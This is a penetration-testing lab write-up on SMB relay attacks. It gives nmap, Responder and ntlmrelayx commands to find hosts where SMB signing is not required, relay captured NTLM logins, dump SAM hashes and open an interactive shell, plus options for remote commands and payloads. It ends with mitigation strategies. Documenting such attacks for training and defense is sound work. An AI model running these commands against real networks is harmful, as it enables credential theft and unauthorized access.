# SMB Relay (MITRE ATT&CK T1557.002)

## Overview

**SMB Relay** is a credential relay attack where captured NTLM authentication attempts are forwarded to another machine instead of being cracked.

Unlike password/hash cracking from an LLMNR poisoning attack, SMB relay allows us to:

* Relay captured NTLM authentication to another target machine
* Dump the SAM database
* Execute commands
* Potentially gain interactive shell access

No password cracking is required.

---

## Attack Requirements

For SMB Relay to succeed:

1. **SMB signing must NOT be required on the target machine**
2. The relayed account must be a **local administrator** on the target
3. Network discovery must be enabled (standard in most enterprise environments)

> ⚠️ In many enterprise environments, SMB signing is enabled but *not required* on workstations.
> Domain Controllers typically have SMB signing enabled and required by default.

---

## Tools Used

* **Responder** – listens for authentication attempts (without responding)
* **ntlmrelayx.py** – relays captured authentication to a specified target

Both tools are part of the Impacket toolkit (ntlmrelayx) and Responder.

---

# Step 1 — Identify Machines with SMB Signing Disabled

We first need to find systems where SMB signing is **not required**.

We use Nmap:

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.177.0/24
```

### Breakdown:

* `--script=smb2-security-mode` → Checks SMB signing status
* `.nse` → Nmap Scripting Engine
* `-p445` → SMB port
* `192.168.177.0/24` → Entire Class C subnet

### Expected Results

* Domain Controller → Signing **enabled and required** (cannot relay)
* Workstations → Signing **enabled but not required** (vulnerable)

📸 Screenshot:

```
screenshots/smb-relay/01-relay-smb-signing-status.png
```

Machines where signing is **enabled but not required** are valid relay targets.

---

# Step 2 — Configure Responder (Listen Only)

We do NOT want Responder to capture or respond.
We only want it to **listen**.

Edit the configuration file:

```bash
nano /etc/responder/Responder.conf
```

Disable:

```
SMB = Off
HTTP = Off
```

📸 Before:

```
screenshots/smb-relay/02-relay-smb-responder-previous.png
```

📸 After:

```
screenshots/smb-relay/03-relay-smb-http-disabled.png
```

Responder is now passive.

---

# Step 3 — Prepare Target List and Launch Relay

Store vulnerable machine IP addresses in:

```
target.txt
```

Then launch:

```bash
ntlmrelayx.py -tf target.txt -smb2support
```

📸 Screenshot:

```
screenshots/smb-relay/04-ntlmrelayx-initiate.png
```

Now:

* Responder listens
* ntlmrelayx relays captured authentication
* Waiting for a victim authentication event

📸 Event:

```
screenshots/smb-relay/05-relay-event.png
```

---

# Result — Dumping the SAM Database

When authentication is captured:

* Responder listens
* ntlmrelayx relays authentication
* SAM hashes are dumped from target machine

📸 Responder:

```
screenshots/smb-relay/06-responder-on-relay-attack.png
```

📸 ntlmrelayx output:

```
screenshots/smb-relay/07-ntlmrelayx-result.png
```

---

## Why Did This Work?

The attack succeeded because:

* SMB signing was **not required**
* The relayed account (`SPECTRA\DADAM`) was a **local administrator**
* NTLM authentication was allowed

Effectively:

> Our attacker Linux machine relayed authentication from one compromised workstation to another and gained privileged access.

---

# Gaining an Interactive SMB Shell

Instead of dumping hashes, we can request an interactive shell.

## Step 4 — Launch Interactive Relay

Start Responder:

```bash
responder -I wlan0 -dwv
```

Start ntlmrelayx with interactive mode:

```bash
ntlmrelayx.py -tf target.txt -smb2support -i
```

📸 Screenshots:

```
screenshots/smb-relay/08-responder-on-relay-gain-shell.png
screenshots/smb-relay/09-ntlmrelayx-on-relay-gain-shell.png
screenshots/smb-relay/10-event-on-relay-gain-shell.png
screenshots/smb-relay/11-ntlmrelayx-result-on-relay-gain-shell.png
```

---

## Connecting to the Interactive Shell

ntlmrelayx starts a local SMB shell listener:

```
127.0.0.1:11000
```

Connect using netcat:

```bash
nc 127.0.0.1 11000
```

📸 Screenshot:

```
screenshots/smb-relay/12-interactive-relay-shell.png
```

After typing `help`, you can:

* Browse shares
* Upload/download files
* Execute commands
* Enumerate users
* Pivot further

---

## Other Execution Options

Interactive shell is not the only method.

You can also:

### Execute a Command

```bash
ntlmrelayx.py -tf target.txt -smb2support -c "whoami"
```

### Execute a Reverse Shell

```bash
ntlmrelayx.py -tf target.txt -smb2support -c "[one-liner reverse shell]"
```

### Execute a Payload

```bash
ntlmrelayx.py -tf target.txt -smb2support -e metashell.exe
```

This could be generated with tools like:

* msfvenom
* Metasploit Framework

---

# MITIGATION STRATEGIES

## 1️⃣ Enforce SMB Signing on All Systems

**Pro**

* Completely prevents SMB relay attacks

**Con**

* May reduce file transfer performance

---

## 2️⃣ Disable NTLM Authentication

**Pro**

* Eliminates NTLM relay attacks

**Con**

* If Kerberos fails, systems may fall back to NTLM
* Requires strict monitoring and configuration

---

## 3️⃣ Account Tiering

**Pro**

* Restricts privileged accounts to specific systems

**Con**

* Difficult to enforce in large enterprises

---

## 4️⃣ Restrict Local Administrator Privileges

**Pro**

* Prevents lateral movement

**Con**

* Increased service desk workload
* User friction

---

# Key Takeaway

SMB relay does not require cracking passwords.

It abuses:

* NTLM authentication
* Weak SMB signing configuration
* Over-permissioned local admin accounts

In large enterprise environments, this can impact hundreds or thousands of machines if not properly mitigated.

---
